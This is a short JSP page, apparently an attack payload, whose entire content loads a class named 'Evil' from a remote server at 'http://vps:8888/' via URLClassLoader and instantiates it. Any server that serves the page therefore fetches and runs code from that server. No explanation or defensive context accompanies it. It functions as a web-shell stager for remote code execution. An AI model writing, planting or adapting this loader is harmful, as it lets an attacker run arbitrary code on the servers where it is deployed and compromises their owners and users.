<%@ page import="java.net.URLClassLoader" %>
<%@ page import="java.net.URL" %>
<%
    String url = "http://vps:8888/";
    URLClassLoader loader = new URLClassLoader(new URL[]{new URL(url)});
    Class a = loader.loadClass("Evil");
    a.newInstance();
%>
